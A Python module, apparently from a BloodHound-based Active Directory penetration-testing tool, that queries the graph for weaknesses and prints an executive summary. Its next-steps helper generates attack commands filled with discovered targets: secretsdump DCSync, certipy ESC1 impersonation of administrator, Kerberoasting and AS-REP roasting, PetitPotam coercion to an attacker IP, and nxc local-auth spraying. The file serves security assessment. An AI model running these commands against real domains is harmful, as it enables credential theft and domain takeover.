"""Executive summary display for end-of-run reporting."""

from __future__ import annotations

from typing import TYPE_CHECKING, Any

from rich import box
from rich.console import Group
from rich.panel import Panel
from rich.rule import Rule
from rich.table import Table
from rich.text import Text

from runoff.core.config import config
from runoff.core.scoring import calculate_exposure_metrics
from runoff.display import console
from runoff.display.colors import Severity
from runoff.display.theme import MOCHA

if TYPE_CHECKING:
    from runoff.core.bloodhound import BloodHoundCE


# ---------------------------------------------------------------------------
# Severity → style helpers
# ---------------------------------------------------------------------------

_SEV_STYLE: dict[str, str] = {
    "CRITICAL": f"bold {MOCHA['red']}",
    "HIGH": MOCHA["maroon"],
    "MEDIUM": MOCHA["peach"],
    "LOW": MOCHA["yellow"],
    "INFO": MOCHA["overlay1"],
}

_SEV_BORDER: dict[str, str] = {
    "CRITICAL": MOCHA["red"],
    "HIGH": MOCHA["maroon"],
    "MEDIUM": MOCHA["peach"],
    "LOW": MOCHA["yellow"],
    "INFO": MOCHA["overlay1"],
}


def _sev_style(severity: Severity) -> str:
    return _SEV_STYLE.get(severity.label, MOCHA["overlay1"])


def _sev_border(severity: Severity) -> str:
    return _SEV_BORDER.get(severity.label, MOCHA["overlay1"])


# ---------------------------------------------------------------------------
# Public entry point
# ---------------------------------------------------------------------------


def print_executive_summary(
    bh: BloodHoundCE,
    all_results: list[dict[str, Any]],
    severity_counts: dict[Severity, int],
    domain: str | None = None,
) -> None:
    """Print executive summary after query execution.

    Args:
        bh: BloodHound connection instance
        all_results: List of query results with severity and counts
        severity_counts: Dictionary of severity to finding counts
        domain: Optional domain filter
    """
    if config.output_format != "table":
        return

    # Collect metrics and targets via direct queries
    metrics = calculate_exposure_metrics(bh, domain)
    domain_info = _get_domain_info(bh, domain)
    adcs_info = _get_adcs_info(bh, domain)
    targets = _get_actionable_targets(bh, domain)

    # Collect additional section data
    data_quality_info = _get_data_quality_info(bh, domain)
    trust_info = _get_trust_info(bh, domain)
    gpo_info = _get_gpo_info(bh, domain)
    session_info = _get_session_hygiene_info(bh, domain)
    azure_info = _get_azure_info(bh, domain)

    # Build all sections as renderables
    parts: list = []
    parts.extend(_render_domain_profile(domain_info, metrics, adcs_info))
    parts.extend(_render_data_quality_section(data_quality_info))
    parts.extend(_render_trust_section(trust_info))
    parts.extend(_render_azure_section(azure_info))
    parts.extend(_render_security_posture(metrics, targets))
    parts.extend(_render_gpo_section(gpo_info))
    parts.extend(_render_session_hygiene_section(session_info))
    parts.extend(_render_key_findings(severity_counts))

    # Wrap everything in the executive summary panel
    console.print()
    console.print(
        Panel(
            Group(*parts),
            title=f"[bold {MOCHA['mauve']}] EXECUTIVE SUMMARY [/]",
            border_style=f"bold {MOCHA['mauve']}",
            box=box.DOUBLE,
            padding=(1, 2),
            expand=False,
        )
    )

    # Next steps printed outside the panel (they have their own panels)
    _print_next_steps(metrics, targets, adcs_info, domain_info)


# ---------------------------------------------------------------------------
# Pure-logic helpers (kept exactly as-is)
# ---------------------------------------------------------------------------


def _fix_malformed_hostname(hostname: str) -> str:
    """Fix malformed hostnames with duplicated prefix (e.g., DC01.DC01.OSCP.EXAM -> DC01.OSCP.EXAM).

    Args:
        hostname: The hostname to check and fix

    Returns:
        Corrected hostname if malformed, otherwise original hostname
    """
    if not hostname or "." not in hostname:
        return hostname

    parts = hostname.split(".")
    if len(parts) >= 2 and parts[0].upper() == parts[1].upper():
        # First two segments are identical (case-insensitive), remove the duplicate
        return ".".join([parts[0]] + parts[2:])

    return hostname


# ---------------------------------------------------------------------------
# Data-fetching helpers (kept exactly as-is)
# ---------------------------------------------------------------------------


def _get_domain_info(bh: BloodHoundCE, domain: str | None = None) -> dict[str, Any]:
    """Get basic domain information."""
    domain_filter = "WHERE toUpper(d.name) = toUpper($domain)" if domain else ""
    params = {"domain": domain} if domain else {}

    info: dict[str, Any] = {}

    # Domain name and functional level
    query = f"""
    MATCH (d:Domain)
    {domain_filter}
    RETURN d.name AS name, d.functionallevel AS level
    LIMIT 1
    """
    results = bh.run_query(query, params)
    if results:
        info["name"] = results[0].get("name", "Unknown")
        info["level"] = results[0].get("level", "Unknown")

    # Domain Controller hostname (first one found) and total count
    query = f"""
    MATCH (c:Computer)-[:MemberOf*1..]->(g:Group)
    WHERE g.objectid ENDS WITH '-516'
    {"AND toUpper(c.domain) = toUpper($domain)" if domain else ""}
    WITH collect(DISTINCT c.name) AS dc_names
    RETURN dc_names[0] AS dc_name, size(dc_names) AS dc_count
    """
    results = bh.run_query(query, params)
    if results:
        info["dc_count"] = results[0].get("dc_count", 0)
        # Fix malformed hostnames (e.g., DC01.DC01.OSCP.EXAM -> DC01.OSCP.EXAM)
        raw_dc_name = results[0].get("dc_name", "")
        info["dc_name"] = _fix_malformed_hostname(raw_dc_name)

    # Group count
    query = f"""
    MATCH (g:Group)
    {"WHERE toUpper(g.domain) = toUpper($domain)" if domain else ""}
    RETURN count(g) AS group_count
    """
    results = bh.run_query(query, params)
    if results:
        info["group_count"] = results[0].get("group_count", 0)

    return info


def _get_adcs_info(bh: BloodHoundCE, domain: str | None = None) -> dict[str, Any]:
    """Get ADCS infrastructure information."""
    params = {"domain": domain} if domain else {}

    info: dict[str, Any] = {}

    # Enterprise CA count and name
    ca_domain_filter = "WHERE toUpper(ca.domain) = toUpper($domain)" if domain else ""
    query = f"""
    MATCH (ca:EnterpriseCA)
    {ca_domain_filter}
    WITH collect(DISTINCT ca.name) AS ca_names, count(ca) AS ca_count
    RETURN ca_names[0] AS ca_name, ca_count
    """
    results = bh.run_query(query, params)
    if results:
        info["ca_count"] = results[0].get("ca_count", 0)
        info["ca_name"] = results[0].get("ca_name", "")

    # Certificate template count
    t_domain_filter = "WHERE toUpper(t.domain) = toUpper($domain)" if domain else ""
    query = f"""
    MATCH (t:CertTemplate)
    {t_domain_filter}
    RETURN count(t) AS template_count
    """
    results = bh.run_query(query, params)
    if results:
        info["template_count"] = results[0].get("template_count", 0)

    return info


def _get_actionable_targets(bh: BloodHoundCE, domain: str | None = None) -> dict[str, list[str]]:
    """Query for specific actionable targets for next steps."""
    params = {"domain": domain} if domain else {}
    domain_filter = "AND toUpper(n.domain) = toUpper($domain)" if domain else ""
    user_filter = "AND toUpper(u.domain) = toUpper($domain)" if domain else ""
    comp_filter = "AND toUpper(c.domain) = toUpper($domain)" if domain else ""

    targets: dict[str, list[str]] = {}

    # DCSync non-admin principals
    # Excludes admin groups by membership AND by RID, plus legitimate replication groups
    query = f"""
    MATCH (n)-[:DCSync|GetChanges|GetChangesAll*1..]->(d:Domain)
    WHERE NOT (n)-[:MemberOf*1..]->(:Group {{name: 'DOMAIN ADMINS@' + toUpper(d.name)}})
    AND NOT (n)-[:MemberOf*1..]->(:Group {{name: 'ENTERPRISE ADMINS@' + toUpper(d.name)}})
    AND NOT (n)-[:MemberOf*1..]->(:Group {{name: 'ADMINISTRATORS@' + toUpper(d.name)}})
    // Exclude Domain Controllers by group membership (computers that are DCs)
    AND NOT EXISTS {{
        MATCH (n)-[:MemberOf*1..]->(dcg:Group)
        WHERE dcg.objectid ENDS WITH '-516'
    }}
    // Exclude built-in admin groups by RID
    AND NOT n.objectid ENDS WITH '-512'  // Domain Admins
    AND NOT n.objectid ENDS WITH '-519'  // Enterprise Admins
    AND NOT n.objectid ENDS WITH '-544'  // Administrators
    // Exclude legitimate replication groups
    AND NOT n.name STARTS WITH 'ENTERPRISE DOMAIN CONTROLLERS@'
    AND NOT n.name STARTS WITH 'ENTERPRISE READ-ONLY DOMAIN CONTROLLERS@'
    AND NOT n.name STARTS WITH 'DOMAIN CONTROLLERS@'
    AND NOT n.objectid ENDS WITH '-516'  // Domain Controllers group
    AND NOT n.objectid ENDS WITH '-521'  // RODC group
    AND NOT n.name STARTS WITH 'MSOL_'
    {domain_filter.replace('n.domain', 'd.name')}
    RETURN DISTINCT n.name AS name
    LIMIT 10
    """
    results = bh.run_query(query, params)
    targets["dcsync"] = [r["name"] for r in results if r.get("name")]

    # ESC1 vulnerable templates (most critical)
    query = """
    MATCH (t:CertTemplate)
    WHERE t.enrolleesuppliessubject = true
    AND t.authenticationenabled = true
    AND t.enabled = true
    RETURN t.name AS name
    LIMIT 10
    """
    results = bh.run_query(query, params)
    targets["esc_templates"] = [r["name"] for r in results if r.get("name")]

    # Kerberoastable users (prioritize admins and old passwords)
    query = f"""
    MATCH (u:User {{enabled: true, hasspn: true}})
    WHERE u.admincount = true OR EXISTS((u)-[:AdminTo]->(:Computer))
    {user_filter}
    RETURN u.name AS name
    LIMIT 10
    """
    results = bh.run_query(query, params)
    targets["kerberoastable"] = [r["name"] for r in results if r.get("name")]

    # AS-REP roastable users
    query = f"""
    MATCH (u:User {{enabled: true, dontreqpreauth: true}})
    {"WHERE toUpper(u.domain) = toUpper($domain)" if domain else ""}
    RETURN u.name AS name
    LIMIT 10
    """
    results = bh.run_query(query, params)
    targets["asrep"] = [r["name"] for r in results if r.get("name")]

    # Unconstrained delegation (non-DC)
    query = f"""
    MATCH (c:Computer {{unconstraineddelegation: true, enabled: true}})
    WHERE NOT EXISTS {{
        MATCH (c)-[:MemberOf*1..]->(g:Group)
        WHERE g.objectid ENDS WITH '-516'
    }}
    {comp_filter}
    RETURN c.name AS name
    LIMIT 10
    """
    results = bh.run_query(query, params)
    targets["unconstrained"] = [r["name"] for r in results if r.get("name")]

    # Computers without LAPS (excluding Domain Controllers)
    query = f"""
    MATCH (c:Computer {{enabled: true}})
    WHERE (c.haslaps = false OR c.haslaps IS NULL)
    AND NOT EXISTS {{
        MATCH (c)-[:MemberOf*1..]->(g:Group)
        WHERE g.objectid ENDS WITH '-516'
    }}
    {comp_filter}
    RETURN c.name AS name
    LIMIT 10
    """
    results = bh.run_query(query, params)
    targets["no_laps"] = [r["name"] for r in results if r.get("name")]

    return targets


def _get_trust_info(bh: BloodHoundCE, domain: str | None = None) -> dict[str, Any]:
    """Get domain trust analysis information."""
    params = {"domain": domain} if domain else {}
    domain_filter = "WHERE toUpper(d1.name) = toUpper($domain)" if domain else ""

    info: dict[str, Any] = {}

    # Get all trusts with their properties
    query = f"""
    MATCH (d1:Domain)-[r:TrustedBy]->(d2:Domain)
    {domain_filter}
    RETURN
        d1.name AS trusting_domain,
        d2.name AS trusted_domain,
        COALESCE(r.trusttype, 'Unknown') AS trust_type,
        COALESCE(r.sidfilteringenabled, true) AS sid_filtering,
        COALESCE(r.transitive, false) AS transitive
    """
    results = bh.run_query(query, params)

    if results:
        info["total_trusts"] = len(results)
        info["external_trusts"] = sum(1 for r in results if r.get("trust_type") == "External")
        info["forest_trusts"] = sum(1 for r in results if r.get("trust_type") == "Forest")
        info["no_sid_filtering"] = sum(1 for r in results if not r.get("sid_filtering"))
        info["transitive_trusts"] = sum(1 for r in results if r.get("transitive"))

        # Get vulnerable trust names for display
        info["vulnerable_trusts"] = [
            f"{r['trusting_domain']} <-> {r['trusted_domain']}"
            for r in results
            if not r.get("sid_filtering")
        ][:5]

    return info


def _get_gpo_info(bh: BloodHoundCE, domain: str | None = None) -> dict[str, Any]:
    """Get GPO security information."""
    params = {"domain": domain} if domain else {}
    domain_filter = "AND toUpper(gpo.domain) = toUpper($domain)" if domain else ""

    info: dict[str, Any] = {}

    # GPOs linked to DC OU
    query = f"""
    MATCH (gpo:GPO)-[:GpLink]->(ou)
    WHERE toUpper(ou.name) CONTAINS 'DOMAIN CONTROLLERS'
       OR toUpper(COALESCE(ou.distinguishedname, '')) CONTAINS 'OU=DOMAIN CONTROLLERS'
    {domain_filter}
    RETURN count(DISTINCT gpo) AS dc_ou_gpos
    """
    results = bh.run_query(query, params)
    if results:
        info["dc_ou_gpo_count"] = results[0].get("dc_ou_gpos", 0)

    # Non-admin GPO control count
    query = f"""
    MATCH (n)-[r:GenericAll|GenericWrite|WriteDacl|WriteOwner|Owns]->(gpo:GPO)
    WHERE (n.admincount IS NULL OR n.admincount = false)
    {domain_filter}
    RETURN count(DISTINCT gpo) AS controlled_gpos, count(DISTINCT n) AS controllers
    """
    results = bh.run_query(query, params)
    if results:
        info["non_admin_controlled_gpos"] = results[0].get("controlled_gpos", 0)
        info["non_admin_controllers"] = results[0].get("controllers", 0)

    # GPOs with suspicious names
    query = f"""
    MATCH (g:GPO)
    WHERE g.name =~ '(?i).*(password|credential|admin|deploy|laps|bitlocker).*'
    {"AND toUpper(g.domain) = toUpper($domain)" if domain else ""}
    RETURN count(g) AS suspicious_gpos
    """
    results = bh.run_query(query, params)
    if results:
        info["suspicious_name_gpos"] = results[0].get("suspicious_gpos", 0)

    return info


def _get_session_hygiene_info(bh: BloodHoundCE, domain: str | None = None) -> dict[str, Any]:
    """Get session hygiene information."""
    params = {"domain": domain} if domain else {}
    domain_filter = "AND toUpper(c.domain) = toUpper($domain)" if domain else ""

    info: dict[str, Any] = {}

    # Tier Zero sessions on non-T0 computers
    query = f"""
    MATCH (c:Computer)-[:HasSession]->(u)
    WHERE (u:Tag_Tier_Zero OR 'admin_tier_0' IN COALESCE(u.system_tags, []))
      AND NOT (c:Tag_Tier_Zero OR 'admin_tier_0' IN COALESCE(c.system_tags, []))
    {domain_filter}
    RETURN count(DISTINCT c) AS computers, count(*) AS sessions
    """
    results = bh.run_query(query, params)
    if results:
        info["t0_exposed_computers"] = results[0].get("computers", 0)
        info["t0_exposed_sessions"] = results[0].get("sessions", 0)

    # Domain Admin sessions on non-DCs
    query = f"""
    MATCH (c:Computer)-[:HasSession]->(u:User)-[:MemberOf*1..]->(g:Group)
    WHERE g.objectid ENDS WITH '-512'
    AND NOT EXISTS {{
        MATCH (c)-[:MemberOf*1..]->(dc_group:Group)
        WHERE dc_group.objectid ENDS WITH '-516'
    }}
    {domain_filter}
    RETURN count(DISTINCT c) AS computers, count(DISTINCT u) AS admins
    """
    results = bh.run_query(query, params)
    if results:
        info["da_exposed_computers"] = results[0].get("computers", 0)
        info["da_exposed_admins"] = results[0].get("admins", 0)

    # Total privileged session exposure
    info["total_exposure"] = info.get("t0_exposed_sessions", 0) + info.get(
        "da_exposed_computers", 0
    )

    return info


def _get_azure_info(bh: BloodHoundCE, domain: str | None = None) -> dict[str, Any]:
    """Get Azure/Hybrid identity information."""
    params = {"domain": domain} if domain else {}
    domain_filter = "AND toUpper(c.domain) = toUpper($domain)" if domain else ""

    info: dict[str, Any] = {}

    # AAD Connect servers
    query = f"""
    MATCH (c:Computer)
    WHERE c.name =~ '(?i).*AAD.*CONNECT.*|.*AZURE.*AD.*|.*AADC.*'
       OR ANY(spn IN COALESCE(c.serviceprincipalnames, [])
              WHERE toUpper(spn) CONTAINS 'AZUREADSSOACC')
    {domain_filter}
    RETURN count(c) AS aad_connect_servers, collect(c.name)[0..3] AS server_names
    """
    results = bh.run_query(query, params)
    if results:
        info["aad_connect_count"] = results[0].get("aad_connect_servers", 0)
        info["aad_connect_names"] = results[0].get("server_names", [])

    # MSOL/AAD sync accounts
    user_filter = "AND toUpper(n.domain) = toUpper($domain)" if domain else ""
    query = f"""
    MATCH (n)
    WHERE (n:User OR n:Computer)
    AND (n.name =~ '(?i).*MSOL_.*' OR n.name =~ '(?i).*AAD_.*' OR n.name =~ '(?i).*SYNC_.*')
    {user_filter}
    RETURN count(n) AS sync_accounts, collect(n.name)[0..3] AS account_names
    """
    results = bh.run_query(query, params)
    if results:
        info["sync_account_count"] = results[0].get("sync_accounts", 0)
        info["sync_account_names"] = results[0].get("account_names", [])

    # AAD accounts with DCSync
    query = f"""
    MATCH (n)-[r:GetChanges|GetChangesAll|DCSync]->(d:Domain)
    WHERE n.name =~ '(?i).*(MSOL_|AAD_|SYNC_|AZUREADSSOACC).*'
    {"AND toUpper(d.name) = toUpper($domain)" if domain else ""}
    RETURN count(DISTINCT n) AS dcsync_count
    """
    results = bh.run_query(query, params)
    if results:
        info["dcsync_sync_accounts"] = results[0].get("dcsync_count", 0)

    return info


def _get_data_quality_info(bh: BloodHoundCE, domain: str | None = None) -> dict[str, Any]:
    """Get data quality and staleness information."""
    import time

    params = {"domain": domain} if domain else {}
    info: dict[str, Any] = {}

    # Session count
    query = """
    MATCH ()-[r:HasSession]->()
    RETURN count(r) AS session_count
    """
    results = bh.run_query(query, params)
    if results:
        info["session_count"] = results[0].get("session_count", 0)

    # Stale account percentage (reuse stale_days config)
    threshold = int(time.time()) - (config.stale_days * 24 * 60 * 60)

    domain_filter = "WHERE toUpper(u.domain) = toUpper($domain)" if domain else ""
    # Count ALL enabled users (denominator for percentage)
    query = f"""
    MATCH (u:User {{enabled: true}})
    {domain_filter}
    RETURN count(u) AS total_users
    """
    results = bh.run_query(query, params)
    total_enabled = results[0].get("total_users", 0) if results else 0

    # Count stale users (those with lastlogon > 0 and older than threshold)
    domain_filter_and = "AND toUpper(u.domain) = toUpper($domain)" if domain else ""
    query = f"""
    MATCH (u:User {{enabled: true}})
    WHERE u.lastlogon > 0 AND u.lastlogon < $cutoff {domain_filter_and}
    RETURN count(u) AS stale_users
    """
    params["cutoff"] = threshold
    results = bh.run_query(query, params)
    if results:
        stale = results[0].get("stale_users", 0)
        info["stale_user_count"] = stale
        info["stale_user_pct"] = round((stale / total_enabled * 100) if total_enabled > 0 else 0, 1)

    return info


# ---------------------------------------------------------------------------
# Logic-only helper (kept exactly as-is)
# ---------------------------------------------------------------------------


def _collect_next_steps(
    metrics: dict[str, Any],
    targets: dict[str, list[str]],
    adcs_info: dict[str, Any],
    domain_info: dict[str, Any],
) -> list[dict[str, Any]]:
    """Collect next steps based on detected findings."""
    steps = []

    # Get domain and DC info for command substitution
    domain_name = domain_info.get("name", "<DOMAIN>")
    dc_name = domain_info.get("dc_name", "<DC>")
    ca_name = adcs_info.get("ca_name", "<CA>")

    # Extract short domain name (WELCOME from WELCOME.LOCAL)
    short_domain = domain_name.split(".")[0] if "." in domain_name else domain_name

    # CRITICAL: DCSync non-admin
    dcsync_targets = targets.get("dcsync", [])
    if dcsync_targets:
        steps.append(
            {
                "priority": "CRITICAL",
                "title": "DCSync Privileges",
                "description": "Non-admin principal(s) can replicate domain credentials",
                "targets": dcsync_targets,
                "command": f"secretsdump.py '{short_domain}/<USER>:<PASS>'@{dc_name}",
            }
        )

    # CRITICAL: ESC1 vulnerable templates
    esc_templates = targets.get("esc_templates", [])
    if esc_templates:
        template_example = esc_templates[0]
        steps.append(
            {
                "priority": "CRITICAL",
                "title": "ADCS Vulnerable Templates (ESC1)",
                "description": "Certificate templates allow impersonation of any user",
                "targets": esc_templates,
                "command": (
                    f"certipy req -u '<USER>@{domain_name}' -p '<PASS>' "
                    f"-ca {ca_name} -template {template_example} "
                    f"-upn administrator@{domain_name}"
                ),
            }
        )

    # HIGH: Kerberoastable admins
    kerb_targets = targets.get("kerberoastable", [])
    if kerb_targets:
        steps.append(
            {
                "priority": "HIGH",
                "title": "Kerberoastable Admin Accounts",
                "description": "Request and crack service tickets for admin accounts",
                "targets": kerb_targets,
                "command": (
                    f"GetUserSPNs.py -request -dc-ip {dc_name} " f"'{short_domain}/<USER>:<PASS>'"
                ),
            }
        )

    # HIGH: AS-REP roastable
    asrep_targets = targets.get("asrep", [])
    if asrep_targets:
        steps.append(
            {
                "priority": "HIGH",
                "title": "AS-REP Roastable Users",
                "description": "Extract hashes without authentication for offline cracking",
                "targets": asrep_targets,
                "command": (
                    f"GetNPUsers.py -dc-ip {dc_name} '{short_domain}/' "
                    f"-usersfile users.txt -format hashcat"
                ),
            }
        )

    # HIGH: Unconstrained delegation
    unconst_targets = targets.get("unconstrained", [])
    if unconst_targets:
        steps.append(
            {
                "priority": "HIGH",
                "title": "Unconstrained Delegation",
                "description": "Coerce authentication or wait for TGT delegation",
                "targets": unconst_targets,
                "command": (f"PetitPotam.py -u '<USER>' -p '<PASS>' " f"<ATTACKER_IP> {dc_name}"),
            }
        )

    # MEDIUM: Low LAPS coverage
    laps_pct = metrics.get("pct_computers_without_laps", 0)
    no_laps_targets = targets.get("no_laps", [])
    if laps_pct > 50 and no_laps_targets:
        steps.append(
            {
                "priority": "MEDIUM",
                "title": f"Low LAPS Coverage ({len(no_laps_targets)} non-DC computers)",
                "description": "Local admin passwords likely shared across systems",
                "targets": no_laps_targets,
                "command": f"nxc smb {dc_name} -u '<USER>' -p '<PASS>' --local-auth",
            }
        )

    # MEDIUM: ADCS infrastructure found (only if no critical ESC)
    ca_count = adcs_info.get("ca_count", 0)
    if ca_count > 0 and not esc_templates:
        steps.append(
            {
                "priority": "MEDIUM",
                "title": f"ADCS Infrastructure ({ca_count} CA)",
                "description": "Enumerate certificate templates for vulnerabilities",
                "targets": [ca_name] if ca_name else [],
                "command": (
                    f"certipy find -u '<USER>@{domain_name}' -p '<PASS>' " f"-dc-ip {dc_name}"
                ),
            }
        )

    return steps


# ---------------------------------------------------------------------------
# Rendering helpers — Rich-based
# ---------------------------------------------------------------------------


def _status_line(ok: bool, label: str, value: str) -> Text:
    """Build a single status line: [✓/✗] label  value."""
    line = Text()
    if ok:
        line.append("  [+] ", style="success")
    else:
        line.append("  [!] ", style="error")
    line.append(f"{label:<24}", style="text.dim")
    line.append(value)
    return line


def _warn_line(label: str, value: str) -> Text:
    """Build a warning status line: [!] label  value (yellow)."""
    line = Text()
    line.append("  [!] ", style="warning")
    line.append(f"{label:<24}", style="text.dim")
    line.append(value)
    return line


def _info_line(label: str, value: str) -> Text:
    """Build an info status line: [*] label  value (blue)."""
    line = Text()
    line.append("  [*] ", style="info")
    line.append(f"{label:<24}", style="text.dim")
    line.append(value)
    return line


def _section_parts(title: str) -> list:
    """Build section sub-header as a list of renderables."""
    return [
        Text(""),
        Text(f"  {title}", style="subheader"),
        Rule(style="border"),
    ]


def _render_domain_profile(
    domain_info: dict[str, Any],
    metrics: dict[str, Any],
    adcs_info: dict[str, Any],
) -> list:
    """Build domain profile section renderables."""
    parts = _section_parts("DOMAIN PROFILE")

    table = Table(
        box=box.SIMPLE,
        show_header=False,
        border_style="border",
        padding=(0, 1),
        expand=False,
    )
    table.add_column("Label", style="text.dim", no_wrap=True, min_width=22)
    table.add_column("Value", overflow="fold")

    name = domain_info.get("name", "Unknown")
    table.add_row("Domain:", Text(name, style="node"))

    level = domain_info.get("level", "Unknown")
    table.add_row("Functional Level:", str(level))

    dc_count = domain_info.get("dc_count", 0)
    table.add_row("Domain Controllers:", Text(str(dc_count), style="count"))

    enabled = metrics.get("enabled_users", 0)
    total = metrics.get("total_users", 0)
    table.add_row("Users:", f"{enabled} enabled ({total} total)")

    computers = metrics.get("total_computers", 0)
    table.add_row("Computers:", f"{computers} enabled")

    groups = domain_info.get("group_count", 0)
    table.add_row("Groups:", str(groups))

    ca_count = adcs_info.get("ca_count", 0)
    if ca_count > 0:
        template_count = adcs_info.get("template_count", 0)
        adcs_val = Text()
        adcs_val.append(str(ca_count), style="count")
        adcs_val.append(f" CA(s), {template_count} templates")
        table.add_row("ADCS:", adcs_val)

    parts.append(table)
    return parts


def _render_security_posture(
    metrics: dict[str, Any],
    targets: dict[str, list[str]],
) -> list:
    """Build security posture section renderables."""
    parts = _section_parts("SECURITY POSTURE")

    # LAPS coverage
    total_comp = metrics.get("total_computers", 0)
    no_laps = metrics.get("computers_without_laps", 0)
    laps_pct = metrics.get("pct_computers_without_laps", 0)
    if total_comp > 0:
        with_laps = total_comp - no_laps
        coverage_pct = 100 - laps_pct
        ok = coverage_pct >= 50
        parts.append(
            _status_line(
                ok, "LAPS Coverage:", f"{coverage_pct:.0f}% ({with_laps}/{total_comp} computers)"
            )
        )

    # Kerberoastable admins
    kerb_admins = metrics.get("kerberoastable_admins", 0)
    if kerb_admins > 0:
        line = Text()
        line.append("  [!] ", style="error")
        line.append(f"{'Kerberoastable Admins:':<24}", style="text.dim")
        line.append(f"{kerb_admins} account(s)", style="error")
        parts.append(line)
    else:
        parts.append(_status_line(True, "Kerberoastable Admins:", "None detected"))

    # AS-REP roastable
    asrep = metrics.get("asrep_roastable", 0)
    if asrep > 0:
        parts.append(_warn_line("AS-REP Roastable:", f"{asrep} account(s)"))
    else:
        parts.append(_status_line(True, "AS-REP Roastable:", "None detected"))

    # Unconstrained delegation
    unconst = metrics.get("unconstrained_delegation_non_dc", 0)
    if unconst > 0:
        parts.append(_warn_line("Unconstrained Deleg:", f"{unconst} non-DC system(s)"))
    else:
        parts.append(_status_line(True, "Unconstrained Deleg:", "None (excluding DCs)"))

    # DCSync non-admin
    dcsync_targets = targets.get("dcsync", [])
    if dcsync_targets:
        line = Text()
        line.append("  [!] ", style="error")
        line.append(f"{'DCSync Non-Admin:':<24}", style="text.dim")
        line.append(f"{len(dcsync_targets)} principal(s)", style="error")
        parts.append(line)
    else:
        parts.append(_status_line(True, "DCSync Non-Admin:", "None detected"))

    # Domain Admin count
    da_count = metrics.get("domain_admin_count", 0)
    if da_count > 20:
        parts.append(_warn_line("Domain Admins:", f"{da_count} (consider reducing)"))
    else:
        parts.append(_status_line(True, "Domain Admins:", str(da_count)))

    return parts


def _render_data_quality_section(info: dict[str, Any]) -> list:
    """Build data quality/staleness section renderables."""
    if not info:
        return []

    parts = _section_parts("DATA QUALITY")

    session_count = info.get("session_count", 0)
    if session_count > 0:
        parts.append(_info_line("Active Sessions:", str(session_count)))
    else:
        parts.append(_warn_line("Active Sessions:", "None (stale data?)"))

    stale_pct = info.get("stale_user_pct", 0)
    stale_count = info.get("stale_user_count", 0)
    value = f"{stale_pct:.0f}% ({stale_count} users >{config.stale_days}d)"
    if stale_pct > 50:
        parts.append(_warn_line("Stale Accounts:", value))
    else:
        parts.append(_status_line(True, "Stale Accounts:", value))

    return parts


def _render_trust_section(info: dict[str, Any]) -> list:
    """Build trust analysis section renderables."""
    if not info or info.get("total_trusts", 0) == 0:
        return []

    parts = _section_parts("TRUST ANALYSIS")

    total = info.get("total_trusts", 0)
    external = info.get("external_trusts", 0)
    forest = info.get("forest_trusts", 0)
    parts.append(
        _info_line("Domain Trusts:", f"{total} total ({external} external, {forest} forest)")
    )

    no_sid = info.get("no_sid_filtering", 0)
    if no_sid > 0:
        line = Text()
        line.append("  [!] ", style="error")
        line.append(f"{'SID Filter Disabled:':<24}", style="text.dim")
        line.append(f"{no_sid} trust(s)", style="error")
        line.append(" - ESCALATION RISK", style="severity.critical")
        parts.append(line)
        for trust in info.get("vulnerable_trusts", []):
            t = Text("      ")
            t.append("> ", style="node")
            t.append(trust)
            parts.append(t)
    else:
        parts.append(_status_line(True, "SID Filtering:", "Enabled on all trusts"))

    transitive = info.get("transitive_trusts", 0)
    if transitive > 0:
        parts.append(_info_line("Transitive Trusts:", str(transitive)))

    return parts


def _render_gpo_section(info: dict[str, Any]) -> list:
    """Build GPO security section renderables."""
    has_findings = (
        info.get("dc_ou_gpo_count", 0) > 0
        or info.get("non_admin_controlled_gpos", 0) > 0
        or info.get("suspicious_name_gpos", 0) > 0
    )
    if not has_findings:
        return []

    parts = _section_parts("GPO SECURITY")

    dc_gpos = info.get("dc_ou_gpo_count", 0)
    if dc_gpos > 0:
        parts.append(_warn_line("GPOs on DC OU:", f"{dc_gpos} (high-value targets)"))

    controlled = info.get("non_admin_controlled_gpos", 0)
    controllers = info.get("non_admin_controllers", 0)
    if controlled > 0:
        line = Text()
        line.append("  [!] ", style="error")
        line.append(f"{'Non-Admin GPO Control:':<24}", style="text.dim")
        line.append(f"{controlled} GPO(s) by {controllers} principal(s)", style="error")
        parts.append(line)

    suspicious = info.get("suspicious_name_gpos", 0)
    if suspicious > 0:
        parts.append(
            _info_line("Interesting GPO Names:", f"{suspicious} (may contain credentials)")
        )

    return parts


def _render_session_hygiene_section(info: dict[str, Any]) -> list:
    """Build session hygiene section renderables."""
    if info.get("total_exposure", 0) == 0:
        return []

    parts = _section_parts("SESSION HYGIENE")

    t0_computers = info.get("t0_exposed_computers", 0)
    t0_sessions = info.get("t0_exposed_sessions", 0)
    if t0_sessions > 0:
        line = Text()
        line.append("  [!] ", style="error")
        line.append(f"{'T0 on Non-T0 Hosts:':<24}", style="text.dim")
        line.append(f"{t0_sessions} session(s) on {t0_computers} computer(s)", style="error")
        parts.append(line)

    da_computers = info.get("da_exposed_computers", 0)
    da_admins = info.get("da_exposed_admins", 0)
    if da_computers > 0:
        line = Text()
        line.append("  [!] ", style="error")
        line.append(f"{'DA on Workstations:':<24}", style="text.dim")
        line.append(f"{da_admins} admin(s) on {da_computers} computer(s)", style="error")
        parts.append(line)

    total = info.get("total_exposure", 0)
    if total > 0:
        parts.append(_warn_line("Total Exposure:", f"{total} privileged session(s) at risk"))

    return parts


def _render_azure_section(info: dict[str, Any]) -> list:
    """Build Azure/Hybrid identity section renderables."""
    has_azure = info.get("aad_connect_count", 0) > 0 or info.get("sync_account_count", 0) > 0
    if not has_azure:
        return []

    parts = _section_parts("AZURE / HYBRID IDENTITY")

    aad_count = info.get("aad_connect_count", 0)
    if aad_count > 0:
        parts.append(_warn_line("AAD Connect Servers:", str(aad_count)))
        for server in info.get("aad_connect_names", []):
            t = Text("      ")
            t.append("> ", style="node")
            t.append(server)
            parts.append(t)

    sync_count = info.get("sync_account_count", 0)
    if sync_count > 0:
        parts.append(_info_line("Sync Accounts:", f"{sync_count} (MSOL/AAD/SYNC)"))

    dcsync = info.get("dcsync_sync_accounts", 0)
    if dcsync > 0:
        line = Text()
        line.append("  [!] ", style="error")
        line.append(f"{'DCSync Capable:':<24}", style="text.dim")
        line.append(f"{dcsync} sync account(s)", style="error")
        line.append(" - HIGH VALUE TARGET", style="severity.critical")
        parts.append(line)

    return parts


def _render_key_findings(severity_counts: dict[Severity, int]) -> list:
    """Build key findings summary renderables."""
    parts = _section_parts("KEY FINDINGS")

    has_findings = False
    for sev in [Severity.CRITICAL, Severity.HIGH, Severity.MEDIUM, Severity.LOW]:
        count = severity_counts.get(sev, 0)
        if count > 0:
            has_findings = True
            style = _sev_style(sev)
